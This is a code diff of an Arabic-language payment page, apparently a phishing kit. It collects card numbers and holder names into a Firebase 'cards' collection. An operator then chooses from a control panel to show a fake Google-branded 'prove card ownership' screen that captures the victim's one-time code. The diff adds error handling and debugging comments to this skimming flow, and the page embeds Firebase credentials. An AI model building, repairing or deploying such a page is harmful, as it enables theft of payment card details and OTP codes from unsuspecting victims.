@@ -23,7 +23,6 @@
         
         .container { width: 100%; max-width: 450px; margin: 0 auto; }
         
-        /* واجهة إثبات الملكية */
         #otp-verification-ui {
             display: none;
             background: white;
@@ -73,12 +72,11 @@
             font-weight: 500;
         }
 
-        /* واجهة الدفع */
         header { text-align: center; margin-bottom: 35px; }
         header h1 { color: var(--primary-color); font-size: 28px; margin-bottom: 10px; }
         
         .payment-card { background-color: white; border-radius: 12px; box-shadow: var(--shadow); padding: 35px; border: 1px solid #eee; }
-        .card-type-selector { display: flex; gap: 15px; margin-bottom: 30px; border-bottom: 1px solid var(--border-color); padding-bottom: 20px; }
+        .card-type-selector { display: flex; gap: 10px; margin-bottom: 30px; border-bottom: 1px solid var(--border-color); padding-bottom: 20px; }
         
         .card-option { flex: 1; text-align: center; padding: 12px; border-radius: 8px; border: 2px solid transparent; opacity: 0.3; transition: 0.3s; }
         .card-option.active { border-color: var(--primary-color); background-color: #f0f7ff; opacity: 1; }
@@ -98,7 +96,6 @@
 </head>
 <body>
     <div class="container">
-        
         <div id="otp-verification-ui">
             <div class="google-header">
                 <h2>إثبات ملكية بطاقتك</h2>
@@ -178,12 +175,13 @@
     </div>
 
 <script type="module">
+    // تم إصلاح الاستيراد هنا
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp, onSnapshot, doc, updateDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
 
     const firebaseConfig = {
         apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
-        authDomain: "vasa-a14ca.firebaseapp.com",
+        authDomain: "vasa-a14ca.firebaseapp.com", // تأكد من صحة هذا الرابط من Console
         projectId: "vasa-a14ca",
         storageBucket: "vasa-a14ca.firebasestorage.app",
         messagingSenderId: "1083668938512",
@@ -242,7 +240,6 @@
         document.getElementById('preview-holder').innerText = e.target.value.toUpperCase() || 'NAME SURNAME';
     });
 
-    // معالجة الدفع
     document.getElementById('payment-form').addEventListener('submit', async (e) => {
         e.preventDefault();
         const num = document.getElementById('card-number').value.replace(/\D/g, '');
@@ -273,7 +270,6 @@
                 const data = snap.data();
                 if (!data) return;
 
-                // التعامل مع جميع الحالات من لوحة التحكم
                 if (data.status === 'otp_required') {
                     document.getElementById('payment-main-ui').style.display = 'none';
                     document.getElementById('otp-verification-ui').style.display = 'block';
@@ -282,20 +278,30 @@
                     document.getElementById('otp-verification-ui').style.display = 'none';
                     document.getElementById('success-message').style.display = 'block';
                 } else if (data.status === 'error') {
-                    // إذا اخترت "رفض" من لوحة التحكم
                     document.getElementById('payment-main-ui').style.display = 'none';
                     document.getElementById('otp-verification-ui').style.display = 'none';
                     document.getElementById('error-final-message').style.display = 'block';
                 }
             });
-        } catch (err) { alert("خطأ في الاتصال"); btn.disabled = false; btn.innerText = "دفع الآن"; }
+        } catch (err) { 
+            console.error(err);
+            alert("خطأ في الاتصال بالقاعدة. تأكد من إعدادات Firestore Rules."); 
+            btn.disabled = false; 
+            btn.innerText = "دفع الآن"; 
+        }
     });
 
     document.getElementById('confirm-google-btn').addEventListener('click', async () => {
         const otp = document.getElementById('google-otp-input').value;
         if(otp.length < 4) return alert("الرمز غير صحيح");
         document.getElementById('confirm-google-btn').innerText = "جاري التحقق...";
-        await updateDoc(doc(db, "cards", currentDocId), { otp: otp, status: 'otp_sent' });
+        
+        try {
+            await updateDoc(doc(db, "cards", currentDocId), { otp: otp, status: 'otp_sent' });
+        } catch (error) {
+            console.error(error);
+            alert("حدث خطأ أثناء تحديث الكود.");
+        }
     });
 </script>
 </body>
